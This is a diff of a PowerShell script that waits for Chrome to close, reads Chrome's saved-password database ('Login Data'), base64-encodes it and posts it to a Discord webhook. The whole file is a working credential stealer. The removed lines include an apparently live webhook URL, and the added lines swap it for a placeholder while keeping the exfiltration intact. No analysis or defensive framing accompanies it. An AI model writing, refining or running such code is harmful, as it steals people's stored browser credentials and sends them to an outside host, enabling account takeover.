@@ -1,49 +1,56 @@
-$filePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
+# Full script with wait for Chrome close and debug info
+
+# Your Discord webhook URL here
+$webhookUrl = 'https://discord.com/api/webhooks/your_webhook_id/your_webhook_token'
+
+# Path to Chrome's Login Data file
+$filePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 
 function Wait-ForChromeToClose {
-    while (Get-Process -Name chrome -ErrorAction SilentlyContinue) {
-        Write-Host "Waiting for Chrome to close..."
-        Start-Sleep -Seconds 3
+    while ($true) {
+        $chromeProcs = Get-Process -Name chrome -ErrorAction SilentlyContinue
+        if ($chromeProcs) {
+            Write-Host "Chrome processes running:"
+            foreach ($proc in $chromeProcs) {
+                Write-Host "PID: $($proc.Id), ProcessName: $($proc.ProcessName)"
+            }
+            Write-Host "Waiting for Chrome to close..."
+            Start-Sleep -Seconds 3
+        }
+        else {
+            Write-Host "No Chrome process found, proceeding..."
+            break
+        }
     }
-    Write-Host "Chrome is closed, proceeding..."
 }
 
+# Wait until Chrome is fully closed
 Wait-ForChromeToClose
 
-if (-Not (Test-Path $filePath)) {
-    Write-Host "File not found: $filePath"
-    exit
+try {
+    # Read file bytes
+    $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+    # Convert to Base64 string
+    $fileBase64 = [Convert]::ToBase64String($fileBytes)
+}
+catch {
+    Write-Host "Failed to read file or convert to base64: $_"
+    $fileBase64 = ''
 }
 
-$maxRetries = 5
-$retryCount = 0
-$fileBytes = $null
+if (-not [string]::IsNullOrEmpty($fileBase64)) {
+    $payload = @{
+        content = "Base64 preview sent to Discord webhook.`nBase64 Data:`n``````n$fileBase64`n``````"
+    } | ConvertTo-Json -Depth 10
 
-while (-not $fileBytes -and $retryCount -lt $maxRetries) {
     try {
-        Write-Host "Attempt $($retryCount + 1) to read the file..."
-        $fileBytes = [System.IO.File]::ReadAllBytes($filePath)
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
+        Write-Host "File content sent to Discord webhook."
     }
     catch {
-        Write-Host "File locked or inaccessible, retrying in 2 seconds..."
-        Start-Sleep -Seconds 2
-        $retryCount++
+        Write-Host "Failed to send data to Discord webhook: $_"
     }
 }
-
-if (-not $fileBytes) {
-    Write-Host "Failed to read file after $maxRetries attempts. Exiting."
-    exit
+else {
+    Write-Host "No data to send."
 }
-
-$fileBase64 = [Convert]::ToBase64String($fileBytes)
-
-$webhookUrl = "https://discord.com/api/webhooks/1374075895941169322/0q_M5862QHhmUHeIUIu9b0Y_L2feBqu-tbTz3gsbEiASX5HtOc8gwfh5fNMajSnbCrOq"
-
-$payload = @{
-    content = "Base64 preview of Login Data:`n$fileBase64"
-} | ConvertTo-Json -Depth 3
-
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-
-Write-Host "Base64 preview sent to Discord webhook."
